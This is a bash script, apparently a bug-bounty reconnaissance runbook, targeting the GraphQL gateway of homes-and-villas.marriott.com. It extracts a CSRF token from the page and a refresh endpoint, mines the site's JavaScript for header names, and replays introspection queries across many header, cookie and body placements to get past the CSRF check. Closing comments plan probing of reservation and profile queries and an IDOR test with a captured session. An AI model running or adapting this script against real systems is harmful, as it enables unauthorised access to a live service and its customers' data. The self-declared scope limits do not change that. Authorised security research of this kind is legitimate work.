#!/usr/bin/env bash
# =============================================================================
# Marriott — HnV GraphQL CSRF mechanism v2 (session39)
# Portable: Linux / Pi / Termux.
#
# s38 found: HTML embeds csrfToken":"<value>"; a /get/refreshtoken endpoint
# exists; an XSRF cookie is set. Replay failed because we (a) used the cookie
# value not the HTML token, and (b) guessed the header name (no X-* csrf header
# exists in the JS). "CSRF token not found" = server isn't seeing the token
# where it looks (delivery problem). This run:
#   A. GET / -> extract the fresh HTML csrfToken value
#   B. GET /get/refreshtoken (with jar) -> capture refreshed token + cookies
#   C. Extract the EXACT header/field name from JS context around csrfToken
#   D. Replay introspection trying the real token across many header names,
#      as a cookie, and in the JSON body — stop on first "data" response.
#
# SAFETY: in-scope, read-only queries (NO mutations), synthetic ids, stop-on-PII.
#
# Run (Termux): OUTDIR=$HOME/s39 bash runbooks/PI-RUNBOOK-session39-hnv-csrf2.sh \
#                 2>&1 | tee $HOME/s39/s39.log
# =============================================================================
set -o pipefail   # NOT -e: grep-finds-nothing must not kill the recon script
if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/s39
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/s39"
  else OUTDIR="$HOME/s39"; fi
fi
export OUTDIR; mkdir -p "$OUTDIR"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
IDH='X-Bug-Bounty: hackerone-researcher'
T="homes-and-villas.marriott.com"; B="https://$T"; JAR="$OUTDIR/jar.txt"

echo "============================================================"
echo "HNV CSRF v2  $(date -u '+%Y-%m-%dT%H:%M:%SZ')   IP: $(curl -s ifconfig.me)"
echo "Work: $OUTDIR"
echo "============================================================"; echo ""

echo "═══ PHASE A: HTML csrfToken ═══"
curl -s -o "$OUTDIR/home.html" -c "$JAR" -H "User-Agent: $UA" -H "$IDH" --max-time 25 "$B/" >/dev/null || true
HTOK=$(grep -oiE 'csrfToken"\s*:\s*"[A-Za-z0-9_-]{12,}' "$OUTDIR/home.html" | head -1 | sed -E 's/.*"([A-Za-z0-9_-]{12,})$/\1/')
echo "  HTML csrfToken: ${HTOK:0:40}${HTOK:+...}"
echo ""

echo "═══ PHASE B: /get/refreshtoken ═══"
curl -s -o "$OUTDIR/refresh.txt" -D "$OUTDIR/refresh.hdr" -b "$JAR" -c "$JAR" \
  -H "User-Agent: $UA" -H "$IDH" -H 'Accept: application/json' -H "Referer: $B/" \
  --max-time 15 -w '  GET /get/refreshtoken -> %{http_code} | %{size_download}B\n' \
  "$B/get/refreshtoken" || true
echo "  body: $(head -c 240 "$OUTDIR/refresh.txt" | tr '\n' ' ')"
echo "  set-cookie:"; grep -i '^set-cookie:' "$OUTDIR/refresh.hdr" 2>/dev/null | sed 's/^/    /' | head -6 || true
# token candidates from refresh response (JSON value or cookie)
RTOK=$(grep -oiE '"(csrf|token|csrfToken|refreshToken)"\s*:\s*"[A-Za-z0-9_.-]{12,}' "$OUTDIR/refresh.txt" | head -1 | sed -E 's/.*"([A-Za-z0-9_.-]{12,})$/\1/')
echo "  refresh token value: ${RTOK:0:40}${RTOK:+...}"
echo ""

echo "═══ PHASE C: EXACT HEADER/FIELD NAME FROM JS ═══"
python3 - << 'PYEOF'
import os,re
O=os.environ["OUTDIR"]
h=open(os.path.join(O,"home.html"),encoding="utf-8",errors="replace").read()
js=set(re.findall(r'src=["\']([^"\']+\.m?js)(?:\?[^"\']*)?["\']',h,re.I))
open(os.path.join(O,"js.txt"),"w").write("\n".join(sorted(js)))
print(f"  {len(js)} js refs (downloading in shell)")
PYEOF
i=0; : > "$OUTDIR/alljs.txt"
while read -r J && [ $i -lt 14 ]; do
  [ -z "$J" ] && continue
  case "$J" in http*) U="$J";; /*) U="$B$J";; *) U="$B/$J";; esac
  curl -s --max-time 20 -b "$JAR" -H "User-Agent: $UA" -H "$IDH" "$U" >> "$OUTDIR/alljs.txt" 2>/dev/null || true
  i=$((i+1)); sleep 0.2
done < "$OUTDIR/js.txt"
python3 - << 'PYEOF'
import os,re
O=os.environ["OUTDIR"]
js=open(os.path.join(O,"alljs.txt"),encoding="utf-8",errors="replace").read()
# show context around each csrfToken usage — the header/field string literal lives next to it
hdrs=set()
for m in re.finditer(r'csrfToken', js):
    ctx=js[max(0,m.start()-120):m.end()+120]
    # header-name-like string literals in the context
    for s in re.findall(r'["\']([A-Za-z][A-Za-z0-9_-]{2,30})["\']\s*[:,]', ctx):
        if re.search(r'csrf|token|xsrf|verif|header',s,re.I): hdrs.add(s)
    print("   ...",ctx.replace("\n"," ")[:200])
print()
print("  candidate header/field names near csrfToken:", sorted(hdrs))
# global hunt for header set calls
sets=set(re.findall(r'(?:set|append|headers?\[)\(?["\']([A-Za-z][A-Za-z0-9_-]{2,30})["\']\s*[,\]]', js))
print("  header names used in set/append calls:", [s for s in sets if re.search(r'csrf|xsrf|token|verif',s,re.I)][:15])
open(os.path.join(O,"hdr-candidates.txt"),"w").write("\n".join(sorted(hdrs)))
PYEOF
echo ""

echo "═══ PHASE D: REPLAY INTROSPECTION WITH REAL TOKEN ═══"
TOK="${RTOK:-$HTOK}"
echo "  using token: ${TOK:0:30}..."
Q='{"query":"query{__schema{queryType{name} types{name kind}}}"}'
# header-name candidates: discovered + common non-X variants
NAMES="csrf-token csrfToken csrftoken csrf_token _csrf csrf x-csrf-token X-CSRF-TOKEN xsrf-token X-XSRF-TOKEN anti-csrf-token requestverificationtoken"
[ -s "$OUTDIR/hdr-candidates.txt" ] && NAMES="$(tr '\n' ' ' < "$OUTDIR/hdr-candidates.txt") $NAMES"
WIN=""
for N in $NAMES; do
  [ -z "$N" ] && continue
  m=$(curl -s -o "$OUTDIR/g.txt" -b "$JAR" \
       -H "User-Agent: $UA" -H "$IDH" \
       -H 'Content-Type: application/json' -H 'Accept: application/json' \
       -H "Origin: $B" -H "Referer: $B/" -H "$N: $TOK" \
       --max-time 20 --data "$Q" \
       -w '%{http_code}|%{size_download}' "$B/gateway/graphql" 2>/dev/null || echo "000|0")
  msg=$(head -c 80 "$OUTDIR/g.txt" | tr '\n' ' ')
  printf '  hdr[%-26s] -> %s | %sB :: %s\n' "$N" "${m%|*}" "${m#*|}" "$msg"
  # WIN = we got PAST the CSRF gate (response no longer "CSRF token not found")
  if [ -s "$OUTDIR/g.txt" ] && ! grep -q 'CSRF token not found' "$OUTDIR/g.txt" 2>/dev/null; then
    WIN="$N"; cp "$OUTDIR/g.txt" "$OUTDIR/csrf-passed.json"
    echo "    ^^^ PAST CSRF GATE with header [$N]"; break
  fi
  sleep 0.3
done
# also try token as a cookie + in body
if [ -z "$WIN" ]; then
  echo "  trying token as cookie (csrfToken / _csrf) + body field..."
  for CN in csrfToken _csrf XSRF-TOKEN; do
    m=$(curl -s -o "$OUTDIR/g.txt" -b "$JAR" -b "$CN=$TOK" \
         -H "User-Agent: $UA" -H "$IDH" -H 'Content-Type: application/json' \
         -H 'Accept: application/json' -H "Origin: $B" -H "Referer: $B/" \
         -H "csrf-token: $TOK" \
         --max-time 20 --data "$Q" \
         -w '%{http_code}|%{size_download}' "$B/gateway/graphql" 2>/dev/null || echo "000|0")
    printf '  cookie[%s] -> %s | %sB :: %s\n' "$CN" "${m%|*}" "${m#*|}" "$(head -c 50 "$OUTDIR/g.txt"|tr '\n' ' ')"
    if grep -q '"data"' "$OUTDIR/g.txt" 2>/dev/null; then WIN="cookie:$CN"; cp "$OUTDIR/g.txt" "$OUTDIR/introspection-success.json"; break; fi
    sleep 0.3
  done
fi
echo ""

echo "════════════════════════════════════════════"
if [ -n "$WIN" ]; then
  echo "  *** PAST CSRF via [$WIN]. Response (first 1400B):"
  head -c 1400 "$OUTDIR/csrf-passed.json"; echo
  echo ""
  echo "  >>> If schema/data returned -> map id-bearing queries; test public ops"
  echo "  >>> (properties/propertyDetails) then user ops (reservationDetails,"
  echo "  >>> getProfileDetails) with synthetic id. If user ops now say"
  echo "  >>> 'unauthorized/session' -> they are session-gated (hvmi_signInToken);"
  echo "  >>> capture an authenticated HnV session next for the IDOR test."
else
  echo "  CSRF still unmatched. The token likely binds to an authenticated session"
  echo "  or a header name only present in the minified JS context above. Inspect"
  echo "  Phase C context lines for the exact set('...', csrfToken) header name."
fi
echo ""
echo "Evidence: $OUTDIR"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
